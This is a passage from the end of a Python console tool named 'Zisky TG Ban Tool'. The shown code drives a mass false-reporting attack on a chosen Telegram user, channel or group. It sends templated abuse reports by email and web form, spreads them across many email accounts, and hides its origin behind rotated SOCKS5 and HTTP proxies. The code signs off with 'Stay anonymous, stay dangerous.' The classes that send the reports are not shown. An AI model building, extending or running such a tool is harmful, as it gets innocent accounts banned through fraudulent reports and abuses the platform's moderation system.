        attack_choice = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Select attack method: {Fore.CYAN}").strip()
        
        print(f"\n{Fore.GREEN}[!] Proxy Options:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}[1] {Fore.WHITE}Use Proxies (Recommended)")
        print(f"    {Fore.CYAN}[2] {Fore.WHITE}Direct Connection (No Proxies)")
        proxy_choice = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Select: {Fore.CYAN}").strip()
        use_proxy = proxy_choice == '1'
        
        count = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Number of reports per method (Enter for 25): {Fore.CYAN}").strip()
        count = int(count) if count.isdigit() else 25
        
        print(f"\n{Fore.RED}{'═'*70}")
        print(f"{Fore.YELLOW}[⚠️] ATTACK SUMMARY")
        print(f"{Fore.RED}{'═'*70}")
        print(f"{Fore.CYAN}Target:{Fore.WHITE} @{target} (ID: {user_id})")
        print(f"{Fore.CYAN}Type:{Fore.WHITE} {report_type.upper()}")
        print(f"{Fore.CYAN}Method:{Fore.WHITE} {['Email', 'Web', 'Combined'][int(attack_choice)-1]}")
        print(f"{Fore.CYAN}Proxies:{Fore.WHITE} {'Enabled' if use_proxy else 'Disabled'}")
        print(f"{Fore.CYAN}Reports:{Fore.WHITE} {count}")
        print(f"{Fore.RED}{'═'*70}")
        
        confirm = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Launch attack? (y/N): {Fore.CYAN}").strip().lower()
        
        if confirm != 'y':
            print(f"{Fore.YELLOW}[⚠️] Attack cancelled")
            return
        
        print(f"\n{Fore.RED}[🚀] ATTACK LAUNCHED AT {datetime.now().strftime('%H:%M:%S')}{Style.RESET_ALL}")
        
        if attack_choice == '1':
            self.email_bomber.attack(target, user_id, report_type, messages, count, use_proxy)
        elif attack_choice == '2':
            self.web_reporter.attack(target, user_id, report_type, messages, count)
        else:
            email_count = count // 2
            web_count = count - email_count
            t = threading.Thread(target=self.email_bomber.attack, args=(target, user_id, report_type, messages, email_count, use_proxy))
            t.start()
            self.web_reporter.attack(target, user_id, report_type, messages, web_count)
            t.join()
        
        print(f"\n{Fore.GREEN}[✅] Attack completed at {datetime.now().strftime('%H:%M:%S')}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}[Press Enter to continue...]{Style.RESET_ALL}")
    
    def proxy_menu(self):
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                    PROXY MANAGEMENT                               ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        while True:
            proxy_stats = self.proxy_manager.get_stats()
            https_stats = self.https_manager.get_stats()
            
            print(f"\n{Fore.GREEN}[!] Current Status:{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}📁 Proxies.txt (SOCKS5 Email):{Fore.WHITE} {proxy_stats['working']}/{proxy_stats['total']} working")
            print(f"    {Fore.CYAN}🔒 https.txt (HTTP Web):{Fore.WHITE} {https_stats['working']}/{https_stats['total']} proxies")
            
            print(f"\n{Fore.GREEN}[!] Options:{Style.RESET_ALL}")
            print(f"    {Fore.CYAN}[1] {Fore.WHITE}Retest all SOCKS5 proxies")
            print(f"    {Fore.CYAN}[2] {Fore.WHITE}View working proxies")
            print(f"    {Fore.CYAN}[3] {Fore.WHITE}Add new proxies")
            print(f"    {Fore.CYAN}[4] {Fore.WHITE}Clear failed proxies")
            print(f"    {Fore.CYAN}[5] {Fore.WHITE}Return to main menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Select: {Fore.CYAN}").strip()
            
            if choice == '1':
                self.proxy_manager.test_all_proxies()
            elif choice == '2':
                print(f"\n{Fore.GREEN}[!] Working SOCKS5 Proxies:{Style.RESET_ALL}")
                for i, p in enumerate(self.proxy_manager.working_proxies[:20], 1):
                    print(f"    {Fore.CYAN}{i}. {Fore.WHITE}{p}")
                if len(self.proxy_manager.working_proxies) > 20:
                    print(f"    {Fore.YELLOW}... and {len(self.proxy_manager.working_proxies)-20} more")
                input(f"\n{Fore.YELLOW}[Press Enter...]")
            elif choice == '3':
                new_proxies = input(f"{Fore.YELLOW}[?] {Fore.WHITE}Enter proxies (one per line, press Enter twice to finish):\n{Fore.CYAN}").strip()
                if new_proxies:
                    for p in new_proxies.split('\n'):
                        if p.strip():
                            self.proxy_manager.proxies.append(p.strip())
                    self.proxy_manager.test_all_proxies()
            elif choice == '4':
                self.proxy_manager.working_proxies = []
                self.proxy_manager.failed_proxies = []
                self.proxy_manager.save_proxies()
                print(f"{Fore.GREEN}[✅] Cleared failed proxies")
            elif choice == '5':
                break
    
    def stats_menu(self):
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                      STATISTICS                                   ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        proxy_stats = self.proxy_manager.get_stats()
        https_stats = self.https_manager.get_stats()
        
        print(f"\n{Fore.GREEN}[!] Proxy Statistics:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}📁 Proxies.txt:{Fore.WHITE}")
        print(f"        Total loaded: {proxy_stats['total']}")
        print(f"        Working: {proxy_stats['working']}")
        print(f"        Failed: {proxy_stats['failed']}")
        print(f"    {Fore.CYAN}🔒 https.txt:{Fore.WHITE}")
        print(f"        Total loaded: {https_stats['total']}")
        print(f"        Available: {https_stats['working']}")
        
        print(f"\n{Fore.GREEN}[!] Email Statistics:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}📧 Email accounts:{Fore.WHITE} {len(EMAIL_CREDENTIALS)}")
        print(f"    {Fore.CYAN}✉️ Abuse emails:{Fore.WHITE} {len(TELEGRAM_ABUSE_EMAILS)}")
        
        print(f"\n{Fore.GREEN}[!] Report Templates:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}👤 User reports:{Fore.WHITE} {len(USER_REPORT_MESSAGES)}")
        print(f"    {Fore.CYAN}📢 Channel reports:{Fore.WHITE} {len(CHANNEL_REPORT_MESSAGES)}")
        print(f"    {Fore.CYAN}👥 Group reports:{Fore.WHITE} {len(GROUP_REPORT_MESSAGES)}")
        
        input(f"\n{Fore.YELLOW}[Press Enter to continue...]{Style.RESET_ALL}")
    
    def templates_menu(self):
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                   REPORT TEMPLATES PREVIEW                        ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[!] User Report Templates (sample):{Style.RESET_ALL}")
        for i, msg in enumerate(USER_REPORT_MESSAGES[:3], 1):
            preview = msg[:150].replace('{username}', '@target').replace('{user_id}', '123456789')
            print(f"\n    {Fore.CYAN}{i}.{Fore.WHITE} {preview}...")
        
        print(f"\n{Fore.GREEN}[!] Channel Report Templates (sample):{Style.RESET_ALL}")
        for i, msg in enumerate(CHANNEL_REPORT_MESSAGES[:2], 1):
            preview = msg[:150].replace('{username}', '@channel').replace('{user_id}', '987654321')
            print(f"\n    {Fore.CYAN}{i}.{Fore.WHITE} {preview}...")
        
        input(f"\n{Fore.YELLOW}[Press Enter to continue...]{Style.RESET_ALL}")
    
    def run(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.show_menu()
            
            choice = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Select option: {Fore.CYAN}").strip()
            
            if choice == '1':
                self.attack_menu()
            elif choice == '2':
                self.proxy_menu()
            elif choice == '3':
                self.stats_menu()
            elif choice == '4':
                self.templates_menu()
            elif choice == '5':
                print(f"\n{Fore.GREEN}[👋] Thanks for using Zisky TG Ban Tool!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[🔒] Stay anonymous, stay dangerous.{Style.RESET_ALL}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[❌] Invalid option{Style.RESET_ALL}")
                time.sleep(1)

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    try:
        tool = ZiskyTGBanTool()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[💥] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        input(f"\n{Fore.YELLOW}[Press Enter to exit...]{Style.RESET_ALL}")
